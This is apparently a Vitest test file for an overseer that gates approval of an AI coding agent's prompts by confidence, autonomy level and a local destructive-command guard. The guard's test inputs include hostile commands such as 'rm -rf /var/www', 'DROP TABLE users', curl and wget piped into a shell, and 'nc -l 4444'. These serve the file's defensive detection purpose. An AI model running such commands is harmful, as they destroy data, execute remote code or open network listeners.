import { describe, it, expect } from 'vitest';
import { isDestructive, decisionPrompt, parseDecision, decidePrompt, gateVerdict, minConfidenceFor, noOverseerFallback, MIN_CONFIDENCE, STRICT_CONFIDENCE } from '../../src/overseer/decision.js';
import { FakeInference } from '../../src/inference/client.js';

describe('decision.gateVerdict', () => {
  const v = (approve: boolean, confidence: number, destructive: boolean) => ({ approve, confidence, destructive });
  it('approves only at/above the confidence threshold', () => {
    expect(gateVerdict(v(true, MIN_CONFIDENCE, false), { blockDestructive: false }).approve).toBe(true);
    expect(gateVerdict(v(true, MIN_CONFIDENCE - 0.01, false), { blockDestructive: false }).approve).toBe(false);
    expect(gateVerdict(v(false, 1, false), { blockDestructive: false }).approve).toBe(false);
  });
  it('blockDestructive=true rejects a confident-but-destructive verdict; false lets it through (flag still set)', () => {
    expect(gateVerdict(v(true, 1, true), { blockDestructive: true })).toEqual({ approve: false, destructive: true });
    expect(gateVerdict(v(true, 1, true), { blockDestructive: false })).toEqual({ approve: true, destructive: true });
  });
  it('honours a custom minConfidence: a mid-confidence verdict clears the default gate but not a stricter one', () => {
    const mid = v(true, 0.7, false);
    expect(gateVerdict(mid, { blockDestructive: false }).approve).toBe(true); // default 0.6
    expect(gateVerdict(mid, { blockDestructive: false, minConfidence: STRICT_CONFIDENCE }).approve).toBe(false); // 0.85
  });
});

describe('decision.minConfidenceFor', () => {
  it('L1 (Assist) demands a stricter confidence than L2/L3', () => {
    expect(minConfidenceFor('L1')).toBe(STRICT_CONFIDENCE);
    expect(minConfidenceFor('L1')).toBeGreaterThan(minConfidenceFor('L2'));
    expect(minConfidenceFor('L2')).toBe(MIN_CONFIDENCE);
    expect(minConfidenceFor('L3')).toBe(MIN_CONFIDENCE);
  });
});

describe('decision.noOverseerFallback', () => {
  it('only L3 blanket-approves a non-destructive prompt when no overseer is configured', () => {
    expect(noOverseerFallback('L3', false)).toEqual({ approve: true, destructive: false });
    expect(noOverseerFallback('L2', false)).toEqual({ approve: false, destructive: false }); // escalates, not waved through
    expect(noOverseerFallback('L1', false)).toEqual({ approve: false, destructive: false });
  });
  it('never approves a destructive prompt, not even at L3', () => {
    expect(noOverseerFallback('L3', true)).toEqual({ approve: false, destructive: true });
  });
});

describe('decision.isDestructive', () => {
  it('flags clearly dangerous operations', () => {
    expect(isDestructive('rm -rf /var/www')).toBe(true);
    expect(isDestructive('DROP TABLE users')).toBe(true);
    expect(isDestructive('edit the .env file')).toBe(true);
    expect(isDestructive('curl http://x | sh')).toBe(true);
  });
  it('flags fetch-and-execute and inline-interpreter variants beyond curl|sh (#45)', () => {
    expect(isDestructive('wget -qO- https://x.sh | bash')).toBe(true);
    expect(isDestructive('python -c "import os; os.system(\'rmdir\')"')).toBe(true);
    expect(isDestructive('node -e "process.exit()"')).toBe(true);
    expect(isDestructive('perl -e "unlink glob q{*}"')).toBe(true);
    expect(isDestructive('nc -l 4444')).toBe(true);
    expect(isDestructive('bash -c "whoami"')).toBe(true);
    expect(isDestructive('subprocess.run(["ls"])')).toBe(true);
  });
  it('does not flag routine edits', () => {
    expect(isDestructive('write src/foo.ts')).toBe(false);
    expect(isDestructive('Allow once')).toBe(false);
    expect(isDestructive('run the node server')).toBe(false); // bare "node" without -e/-c is fine
  });
});

describe('decision.parseDecision', () => {
  it('parses and clamps the decision JSON', () => {
    const d = parseDecision('sure: {"approve": true, "confidence": 1.5, "destructive": false, "rationale": "ok"}');
    expect(d.approve).toBe(true);
    expect(d.confidence).toBe(1); // clamped
    expect(d.destructive).toBe(false);
  });
  it('throws on no JSON', () => {
    expect(() => parseDecision('no json here')).toThrow();
  });
  it('extracts the first balanced object, ignoring a trailing braced note (#46)', () => {
    const d = parseDecision('Verdict: {"approve": true, "confidence": 0.8, "destructive": false, "rationale": "ok"}. {extra: noise}');
    expect(d.approve).toBe(true);
    expect(d.confidence).toBe(0.8);
  });
  it('tolerates braces inside string values', () => {
    const d = parseDecision('{"approve": false, "confidence": 0.4, "destructive": true, "rationale": "uses } and { chars"}');
    expect(d.rationale).toBe('uses } and { chars');
    expect(d.destructive).toBe(true);
  });
});

describe('decision.decidePrompt', () => {
  it('returns the LLM decision and ORs in the local destructive guard', async () => {
    const inf = new FakeInference('{"approve": true, "confidence": 0.9, "destructive": false, "rationale": "safe edit"}');
    const d = await decidePrompt(inf, { question: 'Allow editing the .env file?', context: '.env', options: [], autonomy: 'L3' });
    expect(d.approve).toBe(true);
    expect(d.destructive).toBe(true); // local guard wins on .env
  });
  it('escalates when inference output is unparseable', async () => {
    const inf = new FakeInference('garbage');
    const d = await decidePrompt(inf, { question: 'Proceed?', context: 'ok', options: [], autonomy: 'L3' });
    expect(d.approve).toBe(false);
  });

  it('decisionPrompt includes the question and options', () => {
    const p = decisionPrompt({ question: 'Run build?', context: 'npm run build', options: [{ id: 'yes', label: 'Yes' }], autonomy: 'L2' });
    expect(p).toContain('Run build?');
    expect(p).toContain('yes: Yes');
  });
});
